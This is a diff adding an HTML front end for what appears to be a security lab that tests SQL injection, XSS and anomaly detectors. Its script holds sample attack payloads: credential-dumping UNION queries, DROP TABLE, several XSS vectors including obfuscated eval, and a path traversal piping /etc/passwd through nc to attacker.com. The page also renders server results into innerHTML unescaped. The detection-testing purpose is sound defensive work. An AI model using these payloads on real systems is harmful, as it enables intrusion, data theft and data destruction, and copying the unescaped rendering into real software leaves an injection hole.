@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Lab - AI Anomaly Detection</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+        }
+        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
+        .badge {
+            background: rgba(255,255,255,0.2);
+            padding: 8px 20px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .tab-btn {
+            flex: 1;
+            padding: 15px;
+            background: rgba(255,255,255,0.9);
+            border: none;
+            border-radius: 10px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .tab-btn.active {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .tab-content {
+            display: none;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .tab-content.active { display: block; }
+        .test-section { margin-bottom: 30px; }
+        .test-section h2 {
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+        textarea {
+            width: 100%;
+            min-height: 120px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.95em;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-right: 10px;
+            transition: transform 0.2s;
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .result-box {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+        .result-box.drop {
+            border-left-color: #e74c3c;
+            background: #fee;
+        }
+        .result-box.unknown {
+            border-left-color: #f39c12;
+            background: #ffeaa7;
+        }
+        .result-box.pass {
+            border-left-color: #27ae60;
+            background: #d5f4e6;
+        }
+        .result-item { margin: 8px 0; }
+        .result-label { font-weight: 600; color: #555; }
+        .verdict-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-weight: 600;
+        }
+        .verdict-drop { background: #e74c3c; color: white; }
+        .verdict-unknown { background: #f39c12; color: white; }
+        .verdict-pass { background: #27ae60; color: white; }
+        .sample-payloads {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .sample-btn {
+            background: white;
+            border: 2px solid #667eea;
+            color: #667eea;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9em;
+        }
+        .sample-btn:hover {
+            background: #667eea;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔬 Security Lab - AI Anomaly Detection</h1>
+            <div class="badge">Enhanced ML Engine | 87% Accuracy | Real-time Analysis</div>
+        </div>
+        
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('sql')">🛡️ SQL Injection</button>
+            <button class="tab-btn" onclick="switchTab('xss')">⚠️ XSS Testing</button>
+            <button class="tab-btn" onclick="switchTab('anomaly')">🤖 AI Prediction</button>
+        </div>
+        
+        <!-- SQL Injection Tab -->
+        <div id="sql" class="tab-content active">
+            <div class="test-section">
+                <h2>SQL Injection Detection</h2>
+                <p style="margin-bottom: 15px;">Test SQL injection payloads with ML-based detection</p>
+                <textarea id="sql-payload" placeholder="Enter SQL injection payload..."></textarea>
+                <button class="btn" onclick="testSQL()">🧪 Test Payload</button>
+                <button class="btn" onclick="clearSQL()">🗑️ Clear</button>
+                
+                <h3 style="margin-top: 20px; margin-bottom: 10px;">Sample Payloads:</h3>
+                <div class="sample-payloads">
+                    <button class="sample-btn" onclick="loadSQL(0)">UNION SELECT</button>
+                    <button class="sample-btn" onclick="loadSQL(1)">OR 1=1</button>
+                    <button class="sample-btn" onclick="loadSQL(2)">Comment Injection</button>
+                    <button class="sample-btn" onclick="loadSQL(3)">Advanced SQLi</button>
+                </div>
+                
+                <div id="sql-result"></div>
+            </div>
+        </div>
+        
+        <!-- XSS Tab -->
+        <div id="xss" class="tab-content">
+            <div class="test-section">
+                <h2>Cross-Site Scripting (XSS) Detection</h2>
+                <p style="margin-bottom: 15px;">Test XSS payloads with enhanced pattern recognition</p>
+                <textarea id="xss-payload" placeholder="Enter XSS payload..."></textarea>
+                <button class="btn" onclick="testXSS()">🧪 Test Payload</button>
+                <button class="btn" onclick="clearXSS()">🗑️ Clear</button>
+                
+                <h3 style="margin-top: 20px; margin-bottom: 10px;">Sample Payloads:</h3>
+                <div class="sample-payloads">
+                    <button class="sample-btn" onclick="loadXSS(0)">Script Tag</button>
+                    <button class="sample-btn" onclick="loadXSS(1)">Event Handler</button>
+                    <button class="sample-btn" onclick="loadXSS(2)">JavaScript Protocol</button>
+                    <button class="sample-btn" onclick="loadXSS(3)">Obfuscated</button>
+                </div>
+                
+                <div id="xss-result"></div>
+            </div>
+        </div>
+        
+        <!-- Anomaly Prediction Tab -->
+        <div id="anomaly" class="tab-content">
+            <div class="test-section">
+                <h2>AI-Powered Anomaly Prediction</h2>
+                <p style="margin-bottom: 15px;">Advanced ML-based threat detection with AI analysis</p>
+                <textarea id="anomaly-payload" placeholder="Enter payload for AI analysis..."></textarea>
+                <button class="btn" onclick="testAnomaly()">🤖 Analyze with AI</button>
+                <button class="btn" onclick="clearAnomaly()">🗑️ Clear</button>
+                
+                <h3 style="margin-top: 20px; margin-bottom: 10px;">Mixed Attack Samples:</h3>
+                <div class="sample-payloads">
+                    <button class="sample-btn" onclick="loadAnomaly(0)">Benign</button>
+                    <button class="sample-btn" onclick="loadAnomaly(1)">Suspicious</button>
+                    <button class="sample-btn" onclick="loadAnomaly(2)">Mixed Threat</button>
+                    <button class="sample-btn" onclick="loadAnomaly(3)">Zero-Day Style</button>
+                </div>
+                
+                <div id="anomaly-result"></div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const sqlSamples = [
+            "' UNION SELECT username, password FROM users --",
+            "admin' OR 1=1 --",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT 1, 2, 3 FROM information_schema.tables --"
+        ];
+        
+        const xssSamples = [
+            "<script>alert('XSS')<\/script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<a href=\"javascript:alert('XSS')\">Click</a>",
+            "<svg/onload=alert(String.fromCharCode(88,83,83))>"
+        ];
+        
+        const anomalySamples = [
+            "SELECT * FROM products WHERE id=1",
+            "%27%20OR%201=1%20--",
+            "<script>eval(atob('YWxlcnQoJ1hTUycp'))<\/script>",
+            "../../etc/passwd?exec=cat|nc attacker.com 4444"
+        ];
+        
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+        
+        function loadSQL(index) { document.getElementById('sql-payload').value = sqlSamples[index]; }
+        function loadXSS(index) { document.getElementById('xss-payload').value = xssSamples[index]; }
+        function loadAnomaly(index) { document.getElementById('anomaly-payload').value = anomalySamples[index]; }
+        
+        function clearSQL() { document.getElementById('sql-payload').value = ''; document.getElementById('sql-result').innerHTML = ''; }
+        function clearXSS() { document.getElementById('xss-payload').value = ''; document.getElementById('xss-result').innerHTML = ''; }
+        function clearAnomaly() { document.getElementById('anomaly-payload').value = ''; document.getElementById('anomaly-result').innerHTML = ''; }
+        
+        async function testSQL() {
+            const payload = document.getElementById('sql-payload').value;
+            if (!payload) { alert('Please enter a payload'); return; }
+            
+            const response = await fetch('/api/test-sqli', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ payload })
+            });
+            const result = await response.json();
+            displayResult('sql-result', result);
+        }
+        
+        async function testXSS() {
+            const payload = document.getElementById('xss-payload').value;
+            if (!payload) { alert('Please enter a payload'); return; }
+            
+            const response = await fetch('/api/test-xss', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ payload })
+            });
+            const result = await response.json();
+            displayResult('xss-result', result);
+        }
+        
+        async function testAnomaly() {
+            const payload = document.getElementById('anomaly-payload').value;
+            if (!payload) { alert('Please enter a payload'); return; }
+            
+            const response = await fetch('/api/anomaly-predict', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ payload })
+            });
+            const result = await response.json();
+            displayResult('anomaly-result', result);
+        }
+        
+        function displayResult(elementId, data) {
+            const verdict = data.verdict;
+            const verdictClass = verdict.toLowerCase();
+            
+            const html = `
+                <div class="result-box ${verdictClass}">
+                    <div class="result-item">
+                        <span class="result-label">Verdict:</span>
+                        <span class="verdict-badge verdict-${verdictClass}">${verdict}</span>
+                    </div>
+                    <div class="result-item">
+                        <span class="result-label">Confidence:</span> ${data.confidence.toFixed(1)}%
+                    </div>
+                    <div class="result-item">
+                        <span class="result-label">Attack Type:</span> ${data.attack_type}
+                    </div>
+                    ${data.detected_patterns && data.detected_patterns.length > 0 ? `
+                        <div class="result-item">
+                            <span class="result-label">Detected Patterns:</span>
+                            <ul style="margin-left: 20px; margin-top: 5px;">
+                                ${data.detected_patterns.map(p => `<li>${p}</li>`).join('')}
+                            </ul>
+                        </div>
+                    ` : ''}
+                    <div class="result-item">
+                        <span class="result-label">Reason:</span> ${data.reason}
+                    </div>
+                    ${data.verdict_id ? `
+                        <div class="result-item" style="margin-top: 10px; font-size: 0.85em; color: #888;">
+                            Verdict ID: ${data.verdict_id}
+                        </div>
+                    ` : ''}
+                </div>
+            `;
+            
+            document.getElementById(elementId).innerHTML = html;
+        }
+    </script>
+</body>
+</html>
+
